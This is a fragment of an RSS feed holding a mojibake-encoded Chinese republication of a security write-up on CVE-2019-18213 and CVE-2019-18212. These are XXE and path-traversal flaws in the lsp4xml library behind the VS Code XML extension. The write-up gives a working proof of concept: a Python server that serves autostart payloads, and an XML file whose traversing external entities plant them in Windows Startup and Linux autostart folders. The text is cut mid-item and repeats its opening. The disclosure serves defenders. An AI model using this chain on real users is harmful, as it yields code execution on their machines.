href=&quot;https://link.zhihu.com/?target=https%3A//nvd.nist.gov/vuln/detail/CVE-2019-18213&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;nvd.nist.gov/vuln/detai&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;l/CVE-2019-18213&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;br/&gt;é€‚ç”¨äº Visual Studio å’Œå…¶ä»–äº§å“çš„ 0.9.1 ä¹‹å‰çš„ Red Hat XML è¯­è¨€æ‹“å±•ï¼ˆaka vscode-xmlï¼‰ä¸­ä½¿ç”¨çš„ 0.9.1 ä¹‹å‰çš„ XML è¯­è¨€æœåŠ¡å™¨ï¼ˆaka lsp4xmlï¼‰å…è®¸é€šè¿‡ç²¾å¿ƒåˆ¶ä½œçš„ XML æ–‡æ¡£è¿›è¡Œ XXEï¼Œå¹¶ç”Ÿæˆ SSRF åŠ SMB è¿æ¥å¯åŠ¨ç­‰ã€‚å­˜åœ¨äºextensions / contentmodel / participants / diagnostics / LSPXMLParserConfiguration.java ä¸­ã€‚&lt;br/&gt;CVE-2019-18212ï¼šç›®å½•éå† &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//nvd.nist.gov/vuln/detail/CVE-2019-18212&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;nvd.nist.gov/vuln/detai&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;l/CVE-2019-18212&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;br/&gt;0.9.1 ä¹‹å‰çš„ XML è¯­è¨€æœåŠ¡å™¨ï¼ˆaka lsp4xmlï¼‰ä¸­çš„ XMLLanguageService.javaï¼ˆç”¨äº Visual Studio å’Œå…¶ä»–äº§å“çš„ 0.9.1 ä¹‹å‰çš„ Red Hat XML è¯­è¨€æ‹“å±•ï¼ˆaka vscode-xmlï¼‰ï¼‰å…è®¸è¿œç¨‹æ”»å‡»è€…é€šè¿‡ç›®å½•éå†å†™å…¥ä»»æ„æ–‡ä»¶ã€‚&lt;/blockquote&gt;&lt;h2&gt;XXE å¥‡é‡&lt;/h2&gt;&lt;p&gt;æ‹¿ä¸€ä¸ªæ ‡å‡†çš„ XXE payloadï¼Œå¹¶å¸¦æœ‰æŒ‡å‘æˆ‘ä»¬ç›‘å¬ç½‘ç»œæœåŠ¡å™¨çš„å¤–éƒ¨ DTDï¼Œç›®æ ‡æœåŠ¡å™¨æ— æ³•æ‰§è¡Œå¯¹äº’è”ç½‘çš„ HTTP è¯·æ±‚ï¼Œæ‰€ä»¥æŒ‰é“ç†åªä¼šå­˜åœ¨ä¸€ä¸ª DNS çš„äº¤äº’è¿‡ç¨‹ï¼Œä½†æ˜¯éšåæ”¶åˆ°äº†ä¸¤ä¸ªä¸åŒçš„ DNS äº¤äº’å’Œä¸€ä¸ª HTTP è¯·æ±‚ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿ&lt;/p&gt;&lt;h2&gt;æ¢ç©¶&lt;/h2&gt;&lt;p&gt;åœ¨æˆ‘å°è¯•æ‰¾å‡ºäº¤äº’çš„åŸå› æ—¶ï¼Œå‘ç° HTTP è¯·æ±‚æ¥è‡ªæˆ‘è‡ªå·±çš„ IP åœ°å€ï¼Œè¿™å°±å¥‡æ€ªäº†ã€‚&lt;/p&gt;&lt;p&gt;ä¸ºäº†ä¸€æ¢ç©¶ç«Ÿï¼Œå½“æˆ‘åœ¨ VS Code ä¸­ä¿å­˜æ–°çš„ XML payload æ—¶ï¼Œä½¿ç”¨æ–°çš„ Burp Collaborator å®ä¾‹ä½œä¸ºå›è°ƒæœåŠ¡å™¨é‡æ’­æ‰€æœ‰æ“ä½œæ­¥éª¤ï¼Œå¹¶è§¦å‘äº† XXEã€‚ä¸è¿‡ï¼Œå¯èƒ½å’Œ VS Code å¹¶æ²¡æœ‰ä»»ä½•å…³ç³»ã€‚ã€‚ã€‚&lt;/p&gt;&lt;p&gt;æ‰€æœ‰ï¼Œå…ˆæ£€æŸ¥äº†ä¸€é VS Code çš„é…ç½®å’Œæ’ä»¶ç­‰ï¼Œç„¶åå‘ç°å®‰è£…äº†ä¸€ä¸ªåä¸º XML çš„æ’ä»¶ï¼Œç”± RedHat å‘å¸ƒçš„ã€‚ï¼ˆåº”è¯¥æ˜¯ VS Code æ¨èå®‰è£…çš„ï¼‰&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1623&quot; data-rawheight=&quot;812&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1623&quot; data-original=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1623&quot; data-rawheight=&quot;812&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1623&quot; data-original=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;blockquote&gt;XML è¯¥æ‹“å±•æ’ä»¶çš„ä½œç”¨æ˜¯æä¾›äº†å¯¹åˆ›å»ºå’Œç¼–è¾‘ XML æ–‡æ¡£çš„æ”¯æŒï¼Œå®ƒåŸºäºä½¿ç”¨ Java è¿è¡Œçš„ LSP4XML è¯­è¨€æœåŠ¡å™¨ã€‚&lt;/blockquote&gt;&lt;p&gt;ç¬¬ä¸€æƒ³åˆ°çš„å°±æ˜¯ç¦ç”¨å®ƒï¼Œç„¶åå†è¿›è¡Œåé¢çš„å®éªŒæ­¥éª¤ã€‚&lt;/p&gt;&lt;p&gt;VSCode-XML ä½¿ä½ å¯ä»¥æ‰“å¼€ XML / DTD / XSTL / XSD æ–‡ä»¶å¹¶è§£æå®ƒä»¬çš„è¯­æ³•é”™è¯¯ï¼Œé‡ç‚¹æ˜¯æ ¹æ® DTD / XSD å®šä¹‰éªŒè¯ XML / XSTL æ–‡ä»¶ã€‚&lt;/p&gt;&lt;p&gt;å¯çŸ¥ XXE æ¼æ´æœ¬èº«åœ¨äº LSP4XMLï¼šåœ¨å®‰è£…äº† VSCode-XML çš„ VS Code ä¸­æ‰“å¼€ XML æ–‡ä»¶ç¼–è¾‘æˆ–ä¿å­˜æ—¶ï¼ŒLSP4XML åœ¨æœ¬åœ°è§£ææ–‡ä»¶å¹¶åœ¨ VS Code ç•Œé¢ä¸­æŠ¥é”™ã€‚&lt;/p&gt;&lt;p&gt;&lt;b&gt;ä»¥æ­¤æ„é€ ä¸€ä¸ªæ¶æ„æ–‡ä»¶ï¼Œå½“å®‰è£…äº† VSCode-XML çš„ VS Code çš„ç›®æ ‡æ‰“å¼€è¯¥ XML æ–‡ä»¶æ—¶ï¼Œå®ç°ä¸€ç³»åˆ—åˆ©ç”¨æ“ä½œã€‚&lt;/b&gt;&lt;/p&gt;&lt;p&gt;å°è¯•äº†åœ¨è¿™ç§æƒ…å†µä¸‹ä½¿ç”¨çš„å¸¸è§æ¸—é€æ–¹æ³•ï¼Œä½†æ˜¯ç”±äºæœ€è¿‘çš„ Java ç‰ˆæœ¬ï¼ˆ1.8+ï¼‰å’Œ URL è§£æçš„ç»“åˆï¼Œæ‰€æœ‰æ“ä½œéƒ½å¤±è´¥äº†ã€‚&lt;/p&gt;&lt;p&gt;å¯ä»¥æ‰§è¡Œçš„åªæœ‰ï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;ç›² SSRF&lt;/li&gt;&lt;li&gt;Windows ä¸Šçš„ NetNTLMv2 æ¸—é€&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;å®éªŒ&lt;/h2&gt;&lt;p&gt;åœ¨ç© XXE æ—¶ï¼Œå‘ç°ä¸€ç§å¥‡æ€ªçš„çš„è¡Œä¸ºï¼šurl ä»…æœç´¢ä¸€æ¬¡ï¼Œå†æ¬¡è¿›è¡Œæ“ä½œå°±ä¸ä¼šå»æœç´¢ã€‚åº”è¯¥æ˜¯å­˜åœ¨æŸç§ç¼“å­˜æœºåˆ¶ï¼Œå°† DTD çš„æ–‡ä»¶ä¸‹è½½å¹¶å­˜å‚¨åœ¨æŸä¸ªåœ°æ–¹ã€‚&lt;/p&gt;&lt;p&gt;&lt;b&gt;ç¼“å­˜æœºåˆ¶ï¼š&lt;/b&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;è§£æ XML æ–‡ä»¶&lt;/li&gt;&lt;li&gt;å¦‚æœå¼•ç”¨äº†å¤–éƒ¨å®ä½“ï¼Œåˆ™æ³¨æ˜å…¶ URL&lt;/li&gt;&lt;li&gt;é€šè¿‡æ£€æŸ¥ç›®å½• $HOME/.lsp4xml/cache/http/$host/$path_of_fileï¼Œä½¿ç”¨æŒ‡å®šçš„ URL éªŒè¯æ¥è‡ªåŒä¸€ä¸»æœºçš„æ–‡ä»¶æ˜¯å¦å·²è¢«ç¼“å­˜&lt;/li&gt;&lt;li&gt;å¦‚æœç¼“å­˜æ¡ç›®ä¸å­˜åœ¨ï¼Œåˆ™æ–‡ä»¶è¢«ä¸‹è½½å¹¶ç§»è‡³$HOME/.lsp4xml/cache/http/$host/$path_of_file&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;b&gt;é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œè·¯å¾„èƒ½ä¸èƒ½è¢«æ§åˆ¶ï¼Ÿ&lt;/b&gt;&lt;/p&gt;&lt;p&gt;å¦‚æœå¤–éƒ¨å®ä½“ URL è·¯å¾„ä¸­åŒ…å« ../ ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ&lt;/p&gt;&lt;p&gt;ç»å®éªŒï¼Œç¼“å­˜è¿‡ç¨‹åœ¨ä¿å­˜ç¼“å­˜æ–‡ä»¶æ—¶ä¼šå—åˆ°è·¯å¾„éå†çš„å½±å“ï¼Œä»è€Œå¯ä»¥åœ¨ä»»æ„æœ¬åœ°ç›®å½•ä¸­å†™å…¥ä»»æ„è¿œç¨‹æ–‡ä»¶ã€‚å¦‚æœå°šæœªåˆ›å»ºæ‰€éœ€çš„æ–‡ä»¶å¤¹ç»“æ„ï¼Œæ­¤è¿‡ç¨‹ä¹Ÿèƒ½å®ç°ã€‚&lt;/p&gt;&lt;h2&gt;ä» XXE åˆ° RCE&lt;/h2&gt;&lt;p&gt;æ¼æ´å­˜åœ¨çš„åŸå› æ˜¯åœ¨ç¼“å­˜çš„æœ€åä¸€æ­¥ï¼Œå¦‚æœç¼“å­˜æ¡ç›®ä¸å­˜åœ¨ï¼Œåˆ™æ–‡ä»¶è¢«ä¸‹è½½å¹¶ç§»è‡³å¯¹åº”çš„ç›®å½•ï¼Œå…¶ä¸­å‚æ•° $path_of_file å¯è¢«æ§åˆ¶ï¼Œæ¯”å¦‚å¤–éƒ¨å®ä½“çš„ URL ä¸ºï¼š&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;http://attack.er/../../../../Desktop/test.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç¼“å­˜æ–‡ä»¶å°†è¢«å†™å…¥ $HOME/Desktop/test.txtï¼Œä»è€Œå¯¼è‡´ä»»æ„æ–‡ä»¶å†™å…¥ã€‚&lt;/p&gt;&lt;p&gt;å”¯ä¸€çš„é™åˆ¶å°±æ˜¯ç¼“å­˜æœºåˆ¶çš„ç¬¬ 3 ç‚¹ï¼Œå› æ­¤æ— æ³•è¦†ç›–ä»»ä½•æ–‡ä»¶ï¼Œå¹¶ä¸”æ‰€æœ‰æ“ä½œéƒ½æ˜¯ä½¿ç”¨å½“å‰ç”¨æˆ·æƒé™å®Œæˆçš„ï¼ˆå› æ­¤ï¼Œå¦‚æœå½“å‰ç”¨æˆ·æ˜¯ç®¡ç†å‘˜ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹å†™ï¼Œå¦åˆ™åªèƒ½åœ¨å…¶ä¸»ç›®å½•å¯å†™ï¼‰ã€‚&lt;/p&gt;&lt;p&gt;å¯ä»¥é€šè¿‡æ»¥ç”¨å¯åŠ¨/è‡ªåŠ¨å¯åŠ¨æœºåˆ¶æ¥è½»æ¾å®ç°RCEï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;åœ¨ Windows ç³»ç»Ÿä¸Šï¼Œé€šè¿‡å°†æ‰¹å¤„ç†æ–‡ä»¶å¼•ç”¨ä¸ºå¤–éƒ¨å®ä½“å¹¶ä½¿ç”¨éå†è·¯å¾„å°†å…¶å†™å…¥ $HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ æ–‡ä»¶å¤¹ä¸­ã€‚&lt;/li&gt;&lt;li&gt;åœ¨å¤§å¤šæ•° GNU/Linux ç³»ç»Ÿä¸Šï¼Œé€šè¿‡åœ¨ $HOME/.config/autostart/ æ–‡ä»¶å¤¹ä¸­ç¼–å†™ä¸€ä¸ªâ€œdesktopâ€æ–‡ä»¶ã€‚&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;åªéœ€è¦ç­‰å¾…å—å®³è€…æ³¨é”€å¹¶å†æ¬¡åœ¨å…¶è®¡ç®—æœºä¸Šç™»å½•ä»¥è·å¾—æ‰§è¡Œçš„ä»£ç å³å¯ã€‚&lt;/p&gt;&lt;h2&gt;å½±å“&lt;/h2&gt;&lt;p&gt;åœ¨å®Œæˆ LSP4XML çš„åˆ©ç”¨é“¾ä¹‹åï¼Œé™¤ VSCode-XML ä¹‹å¤–ï¼Œè¿˜å‘ç° Eclipse çš„ wildwebdeveloper æ‰©å±•å’Œ theia-xml-extension ä¹Ÿåœ¨ä½¿ç”¨è¯¥åº“ï¼Œå› æ­¤éƒ½å®¹æ˜“å—åˆ°æ”»å‡»ã€‚&lt;/p&gt;&lt;h2&gt;å®è·µ&lt;/h2&gt;&lt;p&gt;ä»¥ä¸‹æ˜¯åœ¨ Windows å’Œ GNU/Linux ç³»ç»Ÿä¸Šåˆ©ç”¨ XXE å¹¶å®ç° RCE çš„æ­¥éª¤ï¼š&lt;/p&gt;&lt;p&gt;é¦–å…ˆï¼Œå®‰è£… VS Code å’Œ vscode-xml æ‰©å±•&amp;lt;0.9.1ç‰ˆæœ¬ï¼ˆæ³¨æ„ï¼šç›®å‰æœ€æ–°ä¸º 0.10.1ï¼‰ã€‚&lt;/p&gt;&lt;p&gt;åˆ›å»º server.pyï¼ˆPython3ï¼‰å¹¶è¿è¡Œ&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
 
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header(&amp;#39;Content-type&amp;#39;, &amp;#39;application/octet-stream&amp;#39;)
        self.end_headers()
        if &amp;#39;.desktop&amp;#39; in self.path:
            self.wfile.write(b&amp;#39;[Desktop Entry]\nName=Exploit\nGenericName=\nComment=\nExec=sh -c &amp;#34;id;read&amp;#34;\nTerminal=true\nType=Application\nX-GNOME-Autostart-enabled=true&amp;#39;)	
        else:
            self.wfile.write(b&amp;#39;start cmd.exe /k &amp;#34;whoami&amp;#34;&amp;#39;)
        
def run(server_class=HTTPServer, handler_class=RequestHandler, port=9000):
    server_address = (&amp;#39;&amp;#39;, port)
    httpd = server_class(server_address, handler_class)
    print(&amp;#39;Starting httpd on port {}...&amp;#39;.format(port))
    httpd.serve_forever()
 
run()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨ VS code ä¸­æ–°å»ºæ–‡ä»¶å¹¶è¾“å…¥ï¼š&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt;
&amp;lt;!DOCTYPE r [ 
    &amp;lt;!ENTITY linux SYSTEM &amp;#34;http://127.0.0.1:9000/../../../../.config/autostart/cmd.desktop&amp;#34;&amp;gt;
    &amp;lt;!ENTITY windows SYSTEM &amp;#34;http://127.0.0.1:9000/../../../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/cmd.bat&amp;#34;&amp;gt; 
]&amp;gt;
&amp;lt;r&amp;gt;&amp;amp;linux;&amp;amp;windows;&amp;lt;/r&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åä¿å­˜è¯¥ XML æ–‡ä»¶ã€‚&lt;/p&gt;&lt;p&gt;è§‚å¯Ÿå¯¹ Python3 Web æœåŠ¡å™¨çš„è¯·æ±‚ï¼Œå½“ç”¨æˆ·æ‰§è¡Œæ³¨é”€æˆ–ç™»å½•ï¼Œå°†æ‰§è¡Œæ³¨å…¥å‘½ä»¤ï¼ˆåœ¨ Windows ä¸Šæ‰“å¼€â€œå‘½ä»¤æç¤ºç¬¦â€å¹¶æ‰§è¡Œ whoami å‘½ä»¤ï¼Œåœ¨ GNU/Linux ä¸Šæ‰“å¼€ç»ˆç«¯å¹¶æ‰§è¡Œ id å‘½ä»¤ï¼‰&lt;/p&gt;&lt;p&gt;å…·ä½“æ“ä½œï¼š&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.shielder.it/blog/wp-content/uploads/2019/10/Video-xxe-3.gif&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;shielder.it/blog/wp-con&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;tent/uploads/2019/10/Video-xxe-3.gif&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;h2&gt;é˜²èŒƒ&lt;/h2&gt;&lt;p&gt;åŠæ—¶æ›´æ–°æ’ä»¶ VS Code-XML çš„ç‰ˆæœ¬ã€‚&lt;/p&gt;&lt;p&gt;æºè‡ªï¼š&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.shielder.it/blog/dont-open-that-xml-xxe-to-rce-in-xml-plugins-for-vs-code-eclipse-theia/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;shielder.it/blog/dont-o&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;pen-that-xml-xxe-to-rce-in-xml-plugins-for-vs-code-eclipse-theia/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;äºŒå‘ç®”å®‰å…¨&lt;/a&gt;çš„ç½‘ç»œå®‰å…¨æŠ€èƒ½åŒ…æ›´æ–°äº†ï¼CISP-PTE è®¤è¯æŠ€èƒ½åŒ…ï¼Œè®©ä½ å…è´¹ä½“éªŒ CISP-PTE è®¤è¯å†…å®¹ã€‚&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;æ›´å¤šæœ‰å…³æ¸—é€æµ‹è¯•çš„å†…å®¹è¯·å‰å¾€&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;äºŒå‘ç®”å®‰å…¨&lt;/a&gt;è¿›è¡Œå­¦ä¹ ï¼Œæœ€è¿‘æ¨å‡ºäº†â€œæŒ–æ´â€ç­ï¼Œæƒ³äº†è§£æ›´å¤šèµ„è®¯çš„ï¼Œå¯å’¨è¯¢å®¢æœå¾®ä¿¡ &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>äºŒå‘ç®”å®‰å…¨å­¦é™¢</author>
<guid isPermaLink="false">2020-01-17-103044773</guid>
<pubDate>Fri, 17 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>VS Code XMLæ’ä»¶CVEæ¼æ´ï¼šä»XXEåˆ°RCE</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-16-103044773.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/103044773&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-96a8fd622af532186aaf65a15caa3bb6_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;2019 å¹´ä¸­ï¼ŒXXE æ¼æ´â€œæ¨ªè¡Œâ€ï¼Œç›¸æ¯”ä»¥å¾€è€Œè¨€ï¼ŒXXE æ¼æ´é¢å¤–çš„å¤šã€‚ä¾‹å¦‚ï¼šé€šè¿‡ OpenCMS åˆ©ç”¨ Apache Solr&lt;/p&gt;&lt;p&gt;&lt;b&gt;LSP4XMLï¼ˆXML è¯­è¨€æœåŠ¡å™¨ï¼‰&lt;/b&gt;&lt;/p&gt;&lt;p&gt;æ˜¯ä¸€ä¸ªXMLè¯­è¨€å…·ä½“å®ç°è¯­è¨€æœåŠ¡å™¨åè®®ï¼Œå¯ä¸ä»»ä½•ç¼–è¾‘å™¨ä½¿ç”¨æ”¯æŒè¯¥åè®®ï¼Œä»¥æä¾›è‰¯å¥½çš„æ”¯æŒXMLè¯­è¨€ã€‚&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/angelozerr/lsp4xml&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/angelozerr/l&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;sp4xml&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;ç”¨äºè§£æ VSCode-XML ä¸­çš„ XML æ–‡ä»¶ï¼ŒEclipse çš„ wildwebdeveloperï¼Œtheia-xmlç­‰çš„åº“ã€‚å—åˆ° XXEï¼ˆCVE-2019-18213ï¼‰çš„å½±å“ï¼Œé€šè¿‡æ‰“å¼€æ¶æ„ XML æ–‡ä»¶å¯å¯¼è‡´ RCEï¼ˆCVE-2019-18212ï¼‰è¢«åˆ©ç”¨ã€‚&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1682&quot; data-rawheight=&quot;761&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1682&quot; data-original=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1682&quot; data-rawheight=&quot;761&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1682&quot; data-original=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;blockquote&gt;CVE-2019-18213ï¼šXXE &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//nvd.nist.gov/vuln/detail/CVE-2019-18213&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;nvd.nist.gov/vuln/detai&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;l/CVE-2019-18213&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;br/&gt;é€‚ç”¨äº Visual Studio å’Œå…¶ä»–äº§å“çš„ 0.9.1 ä¹‹å‰çš„ Red Hat XML è¯­è¨€æ‹“å±•ï¼ˆaka vscode-xmlï¼‰ä¸­ä½¿ç”¨çš„ 0.9.1 ä¹‹å‰çš„ XML è¯­è¨€æœåŠ¡å™¨ï¼ˆaka lsp4xmlï¼‰å…è®¸é€šè¿‡ç²¾å¿ƒåˆ¶ä½œçš„ XML æ–‡æ¡£è¿›è¡Œ XXEï¼Œå¹¶ç”Ÿæˆ SSRF åŠ SMB è¿æ¥å¯åŠ¨ç­‰ã€‚å­˜åœ¨äºextensions / contentmodel / participants / diagnostics / LSPXMLParserConfiguration.java ä¸­ã€‚&lt;br/&gt;CVE-2019-18212ï¼šç›®å½•éå† &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//nvd.nist.gov/vuln/detail/CVE-2019-18212&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;nvd.nist.gov/vuln/detai&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;l/CVE-2019-18212&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;br/&gt;0.9.1 ä¹‹å‰çš„ XML è¯­è¨€æœåŠ¡å™¨ï¼ˆaka lsp4xmlï¼‰ä¸­çš„ XMLLanguageService.javaï¼ˆç”¨äº Visual Studio å’Œå…¶ä»–äº§å“çš„ 0.9.1 ä¹‹å‰çš„ Red Hat XML è¯­è¨€æ‹“å±•ï¼ˆaka 